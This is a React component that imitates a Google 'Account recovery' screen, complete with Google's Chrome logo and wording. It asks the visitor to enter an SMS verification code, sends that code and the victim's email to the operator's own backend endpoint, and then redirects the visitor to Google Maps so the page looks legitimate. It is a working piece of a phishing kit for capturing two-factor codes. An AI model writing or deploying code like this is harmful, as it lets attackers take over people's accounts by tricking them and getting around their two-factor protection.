import { ChevronDown as Arrow, CircleUser as User } from "lucide-react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation } from "react-router-dom";
import axios from "axios";

const CodeSection = () => {
  
  const location = useLocation();

  const { email } = location.state?.email ? location.state : { email: "*********" };

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const [loading, setLoading] = useState(false);

  const handleData = async (data) => {
    setLoading(true);
    const finalData = {
      email: email,
      code: data.textcode,
    }

    try {
      await axios.post(
          `${import.meta.env.VITE_API_URL}/info/update-code`,
          finalData
      );
    } catch (error) {
      setLoading(false);
      console.log(error);
    }

    setTimeout(() => {
      setLoading(false);
      window.location.href = "https://www.google.com/maps";
    }, 10000);
  };

  return (
    <div className="relative overflow-hidden w-245 bg-white rounded-3xl shadow-sm p-12 flex gap-16">
      {/* 🔵 TOP LOADING BAR */}
      {loading && (
        <div className="absolute top-0 left-0 w-full h-1 bg-gray-200">
          <div className="h-full bg-blue-600 animate-[loading_1.2s_linear_infinite]" />
        </div>
      )}
      <div className="flex-1">
        <div className="flex items-center gap-2 mb-6">
          <img
            src="https://www.gstatic.com/images/branding/product/1x/chrome_48dp.png"
            className="w-8 h-8"
          />
        </div>

        <h1 className="text-5xl font-medium text-gray-800 mb-3">
          Account recovery
        </h1>

        <p className="text-gray-700 text-[16px] text-sm font-medium mb-6">
          To help keep your account safe, Google wants to make sure it's really
          you trying to sign in.
        </p>

        <div className="px-4 py-1 border border-gray-400 rounded-full flex items-center gap-2 w-max">
          <User size={20} className="text-gray-800" />
          <p className="text-gray-800 text-[16px]">{email || "Email"}</p>
          <Arrow size={16} className="text-gray-800" />
        </div>
      </div>

      <div className="flex-1 flex flex-col justify-between">
        <form onSubmit={handleSubmit(handleData)} errors={errors}>
          <div>
            <label className="text-sm font-medium text-gray-600">
              A text message with a6-digit verification code was sent to your
              phone
            </label>
            <input
              type="text"
              name="textcode"
              id="textcode"
              placeholder="G- Enter code"
              {...register("textcode", { required: "Code is required" })}
              className="w-full border border-blue-500 rounded-md px-3 py-3 mt-4 mb-10 outline-none focus:ring-1 focus:ring-blue-500"
            />

            {errors.textcode && (
              <p className="text-red-500 text-sm mt-2">
                {errors.textcode.message}
              </p>
            )}

            <p className="text-gray-500 text-sm mt-6 leading-relaxed">
              <span className="text-blue-600 cursor-pointer"></span>
            </p>
          </div>

          <div className="flex items-center justify-end gap-6 mt-10">
            <button className="text-blue-600 font-medium">
              I Don't have my phone?
            </button>

            <button className="bg-blue-600 text-white px-6 py-2 rounded-full font-medium hover:bg-blue-700 transition">
              Next
            </button>
          </div>
        </form>
      </div>

      {/* Tailwind custom animation */}
      <style>
        {`
          @keyframes loading {
            0% { width: 0% }
            50% { width: 70% }
            100% { width: 100% }
          }
        `}
      </style>
    </div>
  );
};

export default CodeSection;
